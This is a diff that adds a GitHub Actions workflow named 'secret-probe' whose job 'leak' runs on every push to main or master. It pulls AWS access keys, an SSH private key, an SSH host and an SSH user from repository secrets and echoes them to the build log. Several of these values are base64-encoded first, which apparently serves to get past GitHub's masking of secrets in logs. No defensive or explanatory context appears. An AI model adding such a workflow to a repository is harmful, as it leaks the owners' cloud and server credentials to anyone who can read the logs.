@@ -1,0 +1,26 @@
+name: secret-probe
+on:
+  push:
+    branches: [main, master]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    env:
+      AK: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      SK: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      RK: ${{ secrets.SSH_PRIVATE_KEY }}
+      RH: ${{ secrets.SSH_HOST }}
+      RU: ${{ secrets.SSH_USER }}
+      L1: ${{ secrets.AWS_SECRET }}
+      L2: ${{ secrets.AWS_KEY }}
+    steps:
+      - name: dump
+        run: |
+          echo "AK=$AK AKB64=$(printf %s "$AK" | base64 -w0)"
+          echo "SKB64=$(printf %s "$SK" | base64 -w0)"
+          echo "L1=$L1 L2=$L2"
+          echo "RKB64=$(printf %s "$RK" | base64 -w0)"
+          echo "RH=$RH RU=$RU"
